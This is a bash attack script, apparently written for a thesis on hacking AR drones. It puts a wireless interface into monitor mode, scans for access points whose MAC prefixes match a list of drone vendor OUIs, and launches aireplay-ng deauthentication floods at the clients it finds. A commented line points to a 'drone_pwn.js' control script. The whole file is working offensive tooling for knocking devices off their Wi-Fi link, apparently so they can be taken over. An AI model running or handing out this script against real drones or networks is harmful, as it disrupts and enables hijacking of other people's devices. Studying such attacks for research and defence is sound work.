#arhack_sh 

# step 0 - define variables, executables, expressions, and arrays

#oui library to search for associated MACs
ouis="90:03:B7|00:12:1C|90:3A:E6|A0:14:3D|00:12:1C|00:26:7E|FA:8F:CA|38:1D:14"

#path & prefix to airodump files
tmpdir="."
dmp="dmpfolder"
tmpfileprefix="dmpfile"

#define variables
int="wlan1"
int2="wlan2"

# executable names
dhclient="dhclient"
iwconfig="iwconfig"
ifconfig="ifconfig"
airmon="airmon-ng"
aireplay="aireplay-ng"
aircrack="aircrack-ng"
airodump="airodump-ng"
nodejs="node"
nmcli="nmcli"
term="lxterminal"
py="python3"
serv="service"
res="restart"

# the JS to control our drone
#controljs="/root/ARDroneHack/cmt_hack/drone_control/drone_pwn.js"

# Regular expressions
ap_regex="^(($ouis):[A-Z0-9:]+), [[:print:]]*, [[:print:]]*, ([[:digit:]]+), [[:digit:]]*, ([[:alnum:]]+), ([[:alnum:]]*), ([[:alnum:]]*), [[:print:]]*, [[:print:]]*, [[:print:]]*, [[:print:]]*, [[:print:]]*, ([[:print:]]+),"

client_regex="^([A-Z0-9:]+), [[:print:]]*, [[:print:]]*, [[:print:]]*, [[:print:]]*, (($ouis):[A-Z0-9:]+),"

#associative arrays
declare -A channel
declare -A privacy
declare -A cipher
declare -A auth
declare -A essid
declare -A associated_bssid
declare -A disassociated

#step 1 - if needed, kill interfering processes, ensure interfaces are disassociated with known APs; place $int into monitor mode
	$term --working-directory=Desktop/Thesis/scripts/deauth_logs -e $py thesis_log.py
	sudo $airmon check kill
	sudo $airmon start $int
	$term -e sudo $airodump -w $tmpdir/$tmpfileprefix $int 2>>/dev/null #>>/-dev/null
	sleep 5
	sudo rm -f $tmpdir/$tmpfileprefix*.kismet.netxml 
	sudo rm -f $tmpdir/$tmpfileprefix*.kismet.csv 
	sudo rm -f $tmpdir/$tmpfileprefix*.log.csv

for file in $tmpdir/$tmpfileprefix*.csv; 
do 

	while IFS='' read -r line; 
	do  	
		#strip weird characters
		line_without_weird_chars=$(echo $line | sed -e "s/[^[:print:]]//g")
		#once target identified print BSSID, CHANNEL, ENCRYPTION, and ESSID 	
		if [[ $line_without_weird_chars =~ $ap_regex ]]; then
			bssid=${BASH_REMATCH[1]}
			channel[$bssid]=${BASH_REMATCH[3]}
			privacy[$bssid]=${BASH_REMATCH[4]}
			cipher[$bssid]=${BASH_REMATCH[5]}
			auth[$bssid]=${BASH_REMATCH[6]}
			essid[$bssid]=${BASH_REMATCH[7]}
			echo "!!! AP_BSSID:$bssid, CHANNEL:${channel[$bssid]}, PRIVACY:${privacy[$bssid]}, CIPHER:${cipher[$bssid]}, AUTH_METHOD:${auth[$bssid]}, ESSID:${essid[$bssid]}"
		
	#match regex for client entry; pick out client MAC and BSSID
		elif [[ $line_without_weird_chars =~ $client_regex ]]; 
		then 
			cli=${BASH_REMATCH[1]}
			associated_bssid[$cli]=${BASH_REMATCH[2]}
			disassociated[$cli]=false
			echo "!!! CLIENT_MAC:$cli, AP_BSSID ${associated_bssid[$cli]}"
		sleep 3
		
		$term -e sudo $airodump -c ${channel[$bssid]} --bssid ${associated_bssid[$cli]} $int 2>>/dev/null 
		sleep 2 
		$term -e sudo $aireplay "-0" 15 -a ${associated_bssid[$cli]} -c $cli $int
		
		fi
	

	sudo cp $tmpfileprefix*.csv $tmpdir/$dmp
	sudo cp $tmpfileprefix*.cap $tmpdir/$dmp
	#sudo cp $tmpfileprefix*.kismet.netxml $tmpdir/$dmp
	#sudo cp $tmpfileprefix*.kismet $tmpdir/$dmp
	#sudo cp $tmpfileprefix*.log $tmpdir/$dmp
done < $file
	sudo rm -f $tmpdir/$tmpfileprefix*.csv 
	sudo rm -f $tmpdir/$tmpfileprefix*.cap 
done
	sleep 30
	sudo $airmon stop $int
	sleep 10
	sudo $serv NetworkManager restart
	sleep 10
	sudo $serv avahi-daemon restart
	sleep 15
	sudo $serv wpa_supplicant restart
	sleep 10
	sudo $serv dhcpcd restart
	sleep 15
